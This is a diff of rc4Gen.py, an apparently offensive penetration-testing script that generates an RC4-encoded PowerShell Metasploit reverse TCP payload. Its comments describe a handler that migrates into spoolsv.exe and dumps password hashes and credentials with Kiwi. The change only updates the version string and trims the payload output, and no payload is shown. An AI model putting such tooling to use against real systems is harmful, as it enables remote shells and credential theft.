@@ -3,7 +3,7 @@
 # Automatically launches the corresponding MSF Multi/Handler.
 # The Multi/Handler listener is weaponized to automatically migrate into the spoolsv.exe process, load Kiwi, run sysinfo, hashdump, creds_all and lsa_dump.
 # rc4Gen.py supports both command-line parameters and a Wizard driven menu.
-# Version: rc4Gen.py v 1.0
+# Version: rc4Gen.py v 1.10122016
 # Created by: Nick Sanzotta/@beamr
 
 import getopt, os, sys, pyperclip, socket
@@ -30,7 +30,7 @@ banner = colors.green + r"""
  \ \_\\ \____\\/_/\_\_/\ \____/\ \____\ \_\ \_\
   \/_/ \/____/   \/_/   \/___/  \/____/\/_/\/_/
 """+'\n' \
-+ colors.green + '\n rc4Gen.py v1.0' \
++ colors.green + '\n rc4Gen.py v1.10122016' \
 + colors.normal + '\n Description: Generates a MSF Reverse TCP RC4 payload encoded in Powershell to the clipboard.'\
 + colors.normal + '\n Created by: Nick Sanzotta/@beamr' + '\n'\
 + colors.normal + ' ' + '*' * 95 +'\n' + colors.normal
@@ -64,9 +64,9 @@ def payloadGenerator(msfPayload,lhost,lport,rc4Password, verboseChoice):
 		print('LPORT: '+lport)
 		print('RC4PASSWORD: '+rc4Password)
 		print('\n')
-		print(rc4Payload)
+		print(rc4Payload[30:])
 	elif verboseChoice in off:
-		pyperclip.copy(rc4Payload)
+		pyperclip.copy(rc4Payload[30:])
 		print('\nPayload Copied to Clipboard:')
 		print('\nPAYLOAD: '+msfPayload)
 		print('LHOST: '+lhost)
